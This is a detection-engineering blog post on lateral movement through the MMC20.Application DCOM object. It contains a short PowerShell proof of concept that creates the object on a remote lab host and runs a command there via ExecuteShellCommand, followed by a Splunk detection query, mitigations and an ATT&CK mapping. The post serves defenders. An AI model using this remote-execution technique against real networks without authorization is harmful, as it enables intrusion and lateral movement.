---

title: "MMC20 DCOM Lateral Movement – Detection & PoC"
date: 2026-06-22
layout: single
author_profile: true
categories: [Detection Engineering, Lateral Movement, Windows]
tags: [DCOM, MMC20, Splunk, MITRE ATT&CK, Threat Hunting]

---

### PoC and Detection

Hello everyone, You have probably encountered situations where, while designing and creating a Detection Rule or Use Case to identify the MMC20 Application Object-based Lateral Movement technique, you needed to conduct research on this topic.

Recently, I explored the official Microsoft documentation as well as various publicly available Proof of Concepts (PoCs) to better understand what this object actually is and how it can be used.

In this article, we will walk through the topic step by step, covering:

- Background
- How MMC20 works
- PoC
- Detection
- Mitigation

---

## MITRE ATT&CK

- TA0008 – Lateral Movement
- T1021 – Remote Services

---

## Table of Contents

1. Introduction
2. MMC20 Object
3. Exploitation
4. PoC
5. Detection
6. Mitigation
7. MITRE ATT&CK

---

## Introduction

The Microsoft Component Object Model (COM) is a platform-independent, distributed, object-oriented architecture that enables software components to communicate and interact with one another. COM serves as the underlying technology for several Microsoft technologies, including OLE, ActiveX, and many other Windows-based applications and services.

Because COM objects can also be accessed remotely through the Distributed Component Object Model (DCOM), this functionality can be abused by attackers to perform lateral movement between systems within an enterprise environment.

To demonstrate this technique, the following lab environment was used throughout this research.

**Reference:**
https://docs.microsoft.com/en-us/windows/win32/com/the-component-object-model

The diagram below illustrates the relationship between the attacker and victim hosts used throughout this research.
![DCOM Lab Environment](/images/MMC20.png)

---

## Execution

The `MMC20.Application` COM class is registered within the Windows Registry under the CLSID structure. This registry entry allows the component to be instantiated and leveraged for remote interaction via COM/DCOM mechanisms.

The relevant registry location is shown below:

```powershell
Registry Path:
HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}
```

The same information can also be retrieved using PowerShell:

```powershell
Get-ChildItem 'registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'
```

The following screenshot demonstrates the registry enumeration using PowerShell:

![MMC20 Registry Enumeration]({{ "/images/Registry.png" | relative_url }})

---

### Establishing a DCOM Connection to the Victim Host

A remote COM object can be instantiated using the `MMC20.Application` ProgID, allowing interaction with a remote system via DCOM:

```powershell
$a = [System.Activator]::CreateInstance(
    [type]::GetTypeFromProgID("MMC20.Application.1", "192.168.254.132")
)
```

![MMC20 Registry Enumeration]({{ "/images/Screenshot-2026-06-22-091047.png" | relative_url }
---

### Remote Command Execution via DCOM Object

Once the remote COM object is created, it is possible to execute commands on the target system by leveraging the `ExecuteShellCommand` method:

```powershell
$a.Document.ActiveView.ExecuteShellCommand(
    "cmd",
    $null,
    "/c hostname > c:\fromdcom.txt",
    "7"
)
```

This command executes `hostname` on the remote machine and writes the output to `C:\fromdcom.txt`.

---

### Execution Result

The following screenshot illustrates successful command execution on the victim system, where the hostname output has been written to the target file:

![DCOM Command Execution Result]({{ "/images/Screenshot-2026-06-22-091424.png" | relative_url }})

---

## Detection

Detection of MMC20-based lateral movement can be performed using Splunk and App-ES (Enterprise Security). This use case focuses on identifying suspicious DCOM-based remote object activation and unusual COM execution patterns across endpoints.

In the following section, we analyze the implemented detection use case within Splunk App-ES, highlighting how telemetry is correlated to identify potential lateral movement activity.

The screenshot below displays the Analyst queue in App-ES

![Splunk App-ES Detection Use Case]({{ "/images/ES.png" | relative_url }})

---

## Detection Logic (Splunk)

The following Splunk SPL query is used to detect potential MMC20-based lateral movement activity by analyzing process relationships and suspicious MMC execution patterns within the Endpoint data model.

```splunk
| tstats `summariesonly` count
  from datamodel=Endpoint.Processes
  where (
        (Processes.parent_process_name="svchost.exe" AND Processes.process_name="mmc.exe")
        OR (Processes.parent_process_name="mmc.exe" AND Processes.process_name IN ("mmc.exe","cmd.exe","powershell.exe")) 
        OR (Processes.process="C:\\Windows\\system32\\mmc.exe -Embedding")
  )
  by _time Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process
| sort _time
```

The query focuses on identifying abnormal MMC execution chains, including MMC spawning from `svchost.exe`, child process spawning from `mmc.exe`, and direct execution of MMC in embedding mode which is commonly associated with DCOM-based abuse.

---

### Detection Output

The following screenshot shows the results generated from the Splunk App-ES detection query, highlighting potential lateral movement behavior across the monitored environment:

![Splunk MMC20 Detection Output]({{ "/images/Result.png" | relative_url }})

---

## Mitigation

To reduce the risk of MMC20-based DCOM lateral movement, security teams should implement multiple layers of preventive and detective controls across endpoint and network infrastructure.

Key mitigation strategies include:

* Disabling or restricting **DCOM** where it is not required for business operations.
* Blocking **RPC traffic** between workstation systems to limit remote COM/DCOM communication paths.
* Monitoring and detecting suspicious child processes originating from `mmc.exe`, as this may indicate abuse of Microsoft Management Console for remote execution.
* Ensuring that **Windows Defender** or equivalent endpoint protection is enabled and properly configured, as it can provide baseline detection and blocking capabilities for known abuse patterns.
* Verifying that **Windows Firewall** is active and correctly configured to restrict unnecessary inbound and lateral communication.
* Reviewing application control policies to ensure that **Microsoft Management Console (MMC)** is not permitted as an unrestricted execution path or bypass mechanism in security rules.

These controls significantly reduce the attack surface associated with COM/DCOM-based lateral movement techniques and improve visibility into abnormal remote execution behavior within Windows environments.


---

## MITRE ATT&CK Mapping

The MMC20 Application abuse through DCOM is mapped to the following MITRE ATT&CK techniques, primarily focusing on lateral movement and remote service execution mechanisms.

### Technique Mapping

* **T1021.003 – Distributed Component Object Model (DCOM)**
  This technique is directly relevant as the attack leverages COM/DCOM interfaces to execute commands remotely on a victim system.

* **T1047 – Windows Management Instrumentation (WMI)** *(indirect relevance)*
  Although not used in this specific scenario, WMI is often associated with similar remote execution techniques in Windows environments.

* **T1059.003 – Windows Command Shell**
  The execution of `cmd.exe` via the COM object results in command-line based payload execution on the target system.

---

### Attack Flow Context

The MMC20 technique enables an attacker to abuse trusted Windows components to perform lateral movement without relying on traditional remote administration tools. This makes detection more challenging in environments where COM/DCOM usage is normal.

---

### MITRE ATT&CK Visualization

The following diagram illustrates how MMC20-based DCOM abuse aligns within the ATT&CK framework, highlighting its role in lateral movement:

![MITRE ATT&CK MMC20 Mapping]({{ "/images/mitre-mmc20-attack-map.png" | relative_url }})

---

### Summary

This technique demonstrates how legitimate Windows COM infrastructure can be repurposed for adversary-controlled remote execution. From a detection perspective, the behavior primarily manifests under:

* Lateral Movement phase
* Remote Service Abuse
* COM/DCOM object activation anomalies


---

## References

* https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/lateral_movement_dcom_mmc20
* https://substantial-nation-46c.notion.site/Lateral-Movement-via-DCOM-MMC20-e6e798dcd3384566b07e8b7ea66d251a
* https://www.ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model
* https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
* https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand
* https://learn.microsoft.com/en-us/dotnet/api/system.type.gettypefromclsid?view=netframework-4.7.2#System_Type_GetTypeFromCLSID_System_Guid_System_String_
* https://learn.microsoft.com/en-us/windows/win32/com/com-technical-overview
* https://learn.microsoft.com/en-us/windows/win32/com/the-component-object-model
